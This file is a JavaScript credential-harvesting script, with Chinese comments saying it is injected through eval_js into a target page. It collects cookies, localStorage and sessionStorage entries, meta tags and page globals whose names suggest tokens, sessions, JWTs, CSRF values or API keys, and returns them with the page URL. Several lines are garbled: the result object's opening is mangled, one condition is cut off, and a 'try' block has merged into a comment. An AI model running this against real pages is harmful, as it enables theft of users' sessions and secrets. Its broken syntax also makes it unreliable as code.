// 自动扫描所有认证信息来源
// 使用: eval_js 注入目标页面，返回发现的所有 token/key/session

var result cookies: {}, localStorage: {}, sessionStorage: {}, meta: {}, headers: {} };

// 1. Cookie
try {
  var cookies = document.cookie.split(';');
  for (var i = 0; i < cookies.length; i++) {
    var parts = cookies[i].trim().split('=');
    var name = parts[0];
    var value = parts.slice(1).join('='); lower = name.toLowerCase();
    if (lower.indexOf('token') > -1 || lower.indexOf('auth') > -1 || lower.indexOf('session') > -1 ||
        lower.indexOf('key') > -1 || lower.indexOf('prod') > -1 || lower.') > -1 ||
        lower.indexOf('access') > -1 || lower.indexOf('cookie') > -1 || lower.indexOf('sid') > -1) {
      result.cookies[name] = value.substring(0, 100) + (value.length > 100 ? '...[' + value.length + ' chars]' : '');
    }
  }
  result.cookies._total = cookies.length;
} catch(e) { result.cookies._error = e.message; }

// 2. localStorage
try {
  for (var j = 0; j < localStorage.length; j++) {
    var k = localStorage.key(j);
    var kl = k.toLowerCase();
    if (kl.indexOf('token') > -1 || kl.indexOf('auth') > -1 || kl.indexOf('session') > -1 ||
        kl.indexOf('key') > -1 || kl.indexOf('jwt') > -1 || kl.indexOf('access') > -1 ||
        kl.indexOf('user') > -1 || kl.indexOf('credential') > -1) {
      var v = localStorage.getItem(k);
      result.localStorage[k] = v.substring(0, 100) + (v.length > 100 ? '...[' + v.length + ' chars]' : '');
    }
  }
  result.localStorage._total = localStorage.length;
} catch(e) { result.localStorage._error = e.message; }

// 3. sessionStorage
try {
  for (var m = 0; m < sessionStorage.length; m++) {
    var sk = sessionStorage.key(m);
    var skl = sk.toLowerCase();
    if (skl.indexOf('token') > -1 || skl.indexOf('auth') > -1 || skl.indexOf('session') > -1 ||
        skl.indexOf('key') > -1 || skl.indexOf('jwt') > -1 || skl.indexOf('access') > -1) {
      var sv = sessionStorage.getItem(sk);
      result.sessionStorage[sk] = sv.substring(0, 100) + (sv.length > 100 ? '...[' + sv.length + ' chars]' : '');
    }
  }
  result.sessionStorage._total = sessionStorage.length;
} catch(e) { result.sessionStorage._error = e.message; }

// 4. Meta tags
try {
  var metas = document.querySelectorAll('meta[name], meta[property], meta[http-equiv]');
  for (var n = 0; n < metas.length; n++) {
    var mn = metas[n].getAttribute('name') || metas[n].getAttribute('property') || metas[n].getAttribute('http-equiv') || '';
    var mnl = mn.toLowerCase();
    if (mnl.indexOf('token') > -1 || mnl.indexOf('csrf') > -1 || mnl.indexOf('api') > -1 ||
        mnl.indexOf('key') > -1 || mnl.indexOf('nonce') > -1) {
      result.meta[mn] = metas[n].getAttribute('content') || '';
    }
  }
} catch(e) { result.meta._error = e.message; }

// 5. 页面全局变量中var globals = ['__TOKEN__', '__AUTH__', '_token', 'csrfToken', 'apiKey', 'API_KEY', 'authToken'];
  for (var g = 0; g < globals.length; g++) {
    if (window[globals[g]]) {
      result.headers[globals[g]] = String(window[globals[g]]).substring(0, 100);
    }
  }
} catch(e) { result.headers._error = e.message; }

result._url = window.location.href;
result._domain = window.location.hostname;
return JSON.stringify(result);